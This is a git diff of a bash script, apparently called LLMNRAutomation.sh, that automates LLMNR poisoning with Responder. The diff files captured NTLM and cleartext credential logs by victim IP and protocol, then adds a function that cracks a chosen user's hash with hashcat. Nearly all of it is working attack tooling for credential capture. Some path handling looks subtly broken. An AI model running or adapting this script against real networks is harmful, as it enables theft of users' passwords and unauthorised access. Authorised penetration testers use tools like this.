@@ -2,6 +2,7 @@
 
 script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 hashes_dir="$script_dir/hashes"
+cracked_dir="$script_dir/cracked"
 log_dir="/usr/share/responder/logs"
 
 # Update settings from configuration file
@@ -63,8 +64,8 @@ run_responder() {
     if [ "$AuthMethod" != "NTLMv2-SSP" ]; then
         cmd+=" --lm --disable-ess"
     fi
-    echo "Running responder with command: $cmd"
 
+    echo "Running responder with command: $cmd"
     eval "$cmd"
 }
 
@@ -72,22 +73,65 @@ run_responder() {
 handle_hashes() {
     mkdir -p "$hashes_dir"
 
-    # Move hash files to appropriate folders
     for file in "$log_dir"/*.txt; do
         if [ -f "$file" ]; then
             # Extract IP address from the file name
             ip=$(basename "$file" | grep -oP '(?<=-)([0-9a-f.:]+)')
-            mkdir -p "$hashes_dir/$ip"
-            cp "$file" "$hashes_dir/$ip/$(basename "$file")"
+
+            if [[ $(basename "$file") =~ HTTP-NTLMv2-SSP ]]; then
+                protocol="NTLMv2-SSP"
+            elif [[ $(basename "$file") =~ HTTP-NTLMv2 ]]; then
+                protocol="NTLMv2"
+            elif [[ $(basename "$file") =~ HTTP-NTLM-SSP ]]; then
+                protocol="NTLM-SSP"
+            elif [[ $(basename "$file") =~ HTTP-NTLM ]]; then
+                protocol="NTLM"
+            else
+                protocol="Cleartext"
+            fi
+
+            mkdir -p "$hashes_dir/$ip/$protocol"
+            cp "$file" "$hashes_dir/$ip/$protocol/$(basename "$file")"
         fi
     done
+}
+
+
+# handle hash cracking
+crack_hash() {
+    local target_ip=$1
+    local target_user=$2
+
+    local protocols=("Cleartext" "NTLM" "NTLM-SSP" "NTLMv2" "NTLMv2-SSP")
+    local hashcat_mode=("None" "1000" "1000" "5600" "5600")
+
+    for i in "${!protocols[@]}"; do
+        protocol=${protocols[$i]}
+        mode=${hashcat_mode[$i]}
+
+        if [ -d "$hashes_dir/$target_ip./$protocol" ]; then
+            for file in "$hashes_dir/$target_ip./$protocol"/*.txt; do
+                if grep -q "^$target_user" "$file"; then
+                    if [ "$mode" != "None" ]; then
+                        echo "Cracking $protocol hash for $target_user using mode $mode"
+                        sudo hashcat -m "$mode" "$file" -o "$cracked_dir/$target_user-$protocol.txt"
+                        echo "Cracked hash saved to $cracked_dir/$target_user-$protocol.txt"
+                    else
+                        echo "Cleartext password found for $target_user in $file"
+                    fi
+                    return
+                fi
+            done
+        fi
+    done
+    echo "No valid hash found for user $target_user in IP $target_ip"
 }
 
 # Output IP addresses and usernames to choose for cracking
 output() {
     echo "To start cracking, specify target ip with -i and target username with -u (e.g. sudo ./LLMNRAutomation.sh -c -i 10.0.2.15 -u user1)"
-    for file in "$hashes_dir"/*/*.txt; do
-        ip=$(basename "$(dirname "$file")")
+    for file in "$hashes_dir"/*/*/*.txt; do
+        ip=$(basename "$(dirname "../$file")")
         echo "IP: $ip"
         awk -F:: '{print $1}' "$file"
         echo
@@ -100,7 +144,10 @@ main() {
 
     if [ "$1" = "-c" ]; then
         if [ "$2" = "-i" ] && is_valid_ipv4 "$3" && [ "$4" = "-u" ]; then
-            echo "starting hashcat over $1 $2 $3 $4 $5"
+            echo "info: starting hashcat over $1 $2 $3 $4 $5"
+            mkdir -p "$cracked_dir"
+            touch "$cracked_dir/$5.txt"
+            crack_hash "$3" "$5"
         else
             output
         fi
